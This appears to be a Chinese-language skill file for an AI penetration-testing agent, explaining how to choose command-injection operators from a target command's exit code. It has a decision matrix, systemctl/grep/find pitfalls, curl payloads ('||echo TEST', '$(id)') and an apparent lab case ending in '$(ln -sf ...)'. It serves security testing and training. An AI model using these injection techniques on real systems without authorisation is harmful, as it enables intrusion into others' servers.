---
name: 'cmd-injection-exit-code-precheck'
description: '命令注入前必测：目标命令的 exit code 决定用 || / && / $(...) — systemctl/grep/find 的经典陷阱'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---


# 命令注入前置检查：目标命令的 exit code

> 🔴 **每次命令注入必做的第一步** — 不要假设 `||` 或 `&&` 能工作

## 问题

命令注入的 payload 选择（`||` / `&&` / `;` / `$(...)` / `` ` ``）取决于**目标命令在收到你的输入后的 exit code**。

## 决策流程

```bash
# Step 1: 确定注入模板
# 假设注入点是: command --flag {USER_INPUT}

# Step 2: 测试空/无效输入时目标命令的 exit code
# 发送空 payload 或无害字符，观察行为
resp = trigger("test")  # 无特殊字符
# → 命令是否报错？
# → 命令是否崩溃？
# → 命令是否静默成功？

# Step 3: 根据 exit code 选择操作符
```text

## 操作符选择矩阵

| 目标命令行为 | 用这个 | 原因 |
|-------------|--------|------|
| 无效输入 → exit **非 0**（报错） | `\|\| cmd` | 前命令失败才执行 |
| 无效输入 → exit **0**（静默成功） | `&& cmd` 或 `$(cmd)` | 前命令成功才执行 |
| 无效输入 → exit **任意** | `$(cmd)` | **命令替换无条件执行** |
| 无效输入 → 未知 | `$(cmd)` | 最安全选择，无条件 |
| `;` 不被过滤 | `; cmd` | 无条件顺序执行 |
| `\|\|` 和 `&&` 都被过滤 | `$(cmd)` 或 `` `cmd` `` | 回退方案 |

## 🔴 经典陷阱

### 陷阱 1: systemctl 的假 `||`

```yaml
注入: systemctl status --no-pager {INPUT}
Payload: ||id

期待: systemctl 失败 → 执行 id
实际: systemctl status --no-pager  → 显示系统状态 → exit 0（成功！）
      || 不触发！
```text

**教训**: `systemctl status --no-pager` 无服务名时**成功**退出，显示整体状态。

### 陷阱 2: grep 的假 `||`

```yaml
注入: grep {PATTERN} {INPUT} /var/log/syslog
Payload: ||id

期待: grep 失败 → 执行 id
实际: 取决于文件是否存在和 PATTERN 是否合法
```text

### 陷阱 3: find 的假 `&&`

```yaml
注入: find /opt -name {INPUT}
Payload: $(id)

期待: $(id) 展开为空 → find 正常运行
实际: find 报 "unknown predicate" → exit 非 0（但 $(...) 已执行）
```text

✅ `$(...)` 在这种情况下安全，因为它**在 find 执行前**已展开。

## $(...) vs `||` 的本质区别

```text
||cmd    → 前命令先执行 → exit 非 0 才执行 cmd（依赖前命令结果）
$(cmd)   → bash 先执行 cmd（在解析主命令时替换）→ 替换结果插入命令行 → 主命令执行
`cmd`    → 同 $(...)（旧式语法）
```text

**关键**: `$(cmd)` 的执行**不依赖**主命令的 exit code。它总是先执行。

## 实战步骤

```bash
# 1. 先测 exit code
curl -X POST target/cmd -d "input="        # 空输入 → 看响应
curl -X POST target/cmd -d "input=test"    # 无害输入 → 看响应
curl -X POST target/cmd -d "input=||echo TEST"  # 直接试 || 

# 2. 确认 $(...) 可行
curl -X POST target/cmd -d "input=$(echo TEST)" # 如果显示 TEST → $(...) 可行

# 3. 确认 ` ` 可行（如果 $( ) 被过滤）
curl -X POST target/cmd -d 'input=`echo TEST`'   # 注意反引号
```text

## DevArea 案例

```yaml
模板: systemctl status --no-pager {INPUT}
空输入: exit 0（显示系统状态）→ || 不触发
改用: $(ln -sf ...) → 无条件执行
```text
